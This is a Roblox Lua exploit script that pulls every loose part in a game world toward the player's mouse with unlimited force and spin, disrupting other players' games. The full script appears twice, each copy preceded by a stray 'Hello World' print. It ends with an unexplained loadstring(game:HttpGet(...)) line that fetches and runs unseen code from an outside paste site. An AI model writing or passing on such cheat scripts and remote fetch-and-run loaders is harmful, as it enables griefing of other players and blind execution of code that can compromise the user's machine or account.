print('Hello World!');local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()

local Folder = Instance.new("Folder", game:GetService("Workspace"))
local Part = Instance.new("Part", Folder)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1

local Attachment1 = Instance.new("Attachment", Part)

local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
local ForceStrength = math.huge

local function TeleportPart(v)
   if v:IsA("Part") and v.Anchored == false and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
       Mouse.TargetFilter = v
       for _, x in next, v:GetChildren() do
           if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
               x:Destroy()
           end
       end
       if v:FindFirstChild("Attachment") then
           v:FindFirstChild("Attachment"):Destroy()
       end

       v.CanCollide = false

       local Torque = Instance.new("BodyAngularVelocity", v)
       Torque.AngularVelocity = Vector3.new(0, math.rad(ForceStrength * 4), 0) -- 更快的旋转速度

       local AlignPosition = Instance.new("AlignPosition", v)
       local Attachment2 = Instance.new("Attachment", v)

       AlignPosition.MaxForce = math.huge
       AlignPosition.MaxVelocity = math.huge
       AlignPosition.Responsiveness = math.huge  -- 始终在吸取范围内
       AlignPosition.Attachment0 = Attachment2
       AlignPosition.Attachment1 = Attachment1
   end
end

local function TeleportAllParts()
   for _, v in next, game:GetService("Workspace"):GetDescendants() do
       if v:IsA("Part") and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
           TeleportPart(v)
       end
   end
end

TeleportAllParts()

game:GetService("Workspace").DescendantAdded:Connect(function(v)
   if v:IsA("Part") and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
       TeleportPart(v)
   end
end)

UserInputService.InputBegan:Connect(function(Key, Chat)
   if Key.KeyCode == Enum.KeyCode.E and not Chat then
       Updated = Mouse.Hit + Vector3.new(0, 5, 0)
   end
end)

spawn(function()
   while game:GetService("RunService").RenderStepped:Wait() do
       Attachment1.WorldCFrame = Updated
   end
end)
print('Hello World!');local UserInputService = game:GetService("UserInputService")
local Mouse = game:GetService("Players").LocalPlayer:GetMouse()

local Folder = Instance.new("Folder", game:GetService("Workspace"))
local Part = Instance.new("Part", Folder)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1

local Attachment1 = Instance.new("Attachment", Part)

local Updated = Mouse.Hit + Vector3.new(0, 5, 0)
local ForceStrength = math.huge

local function TeleportPart(v)
   if v:IsA("Part") and v.Anchored == false and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
       Mouse.TargetFilter = v
       for _, x in next, v:GetChildren() do
           if x:IsA("BodyAngularVelocity") or x:IsA("BodyForce") or x:IsA("BodyGyro") or x:IsA("BodyPosition") or x:IsA("BodyThrust") or x:IsA("BodyVelocity") or x:IsA("RocketPropulsion") then
               x:Destroy()
           end
       end
       if v:FindFirstChild("Attachment") then
           v:FindFirstChild("Attachment"):Destroy()
       end

       v.CanCollide = false

       local Torque = Instance.new("BodyAngularVelocity", v)
       Torque.AngularVelocity = Vector3.new(0, math.rad(ForceStrength * 4), 0) -- 更快的旋转速度

       local AlignPosition = Instance.new("AlignPosition", v)
       local Attachment2 = Instance.new("Attachment", v)

       AlignPosition.MaxForce = math.huge
       AlignPosition.MaxVelocity = math.huge
       AlignPosition.Responsiveness = math.huge  -- 始终在吸取范围内
       AlignPosition.Attachment0 = Attachment2
       AlignPosition.Attachment1 = Attachment1
   end
end

local function TeleportAllParts()
   for _, v in next, game:GetService("Workspace"):GetDescendants() do
       if v:IsA("Part") and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
           TeleportPart(v)
       end
   end
end

TeleportAllParts()

game:GetService("Workspace").DescendantAdded:Connect(function(v)
   if v:IsA("Part") and v.Parent ~= game:GetService("Players").LocalPlayer.Character then
       TeleportPart(v)
   end
end)

UserInputService.InputBegan:Connect(function(Key, Chat)
   if Key.KeyCode == Enum.KeyCode.E and not Chat then
       Updated = Mouse.Hit + Vector3.new(0, 5, 0)
   end
end)

spawn(function()
   while game:GetService("RunService").RenderStepped:Wait() do
       Attachment1.WorldCFrame = Updated
   end
end)

loadstring(game:HttpGet(('https://pastefy.app/BbXuvVkK/raw'),true))()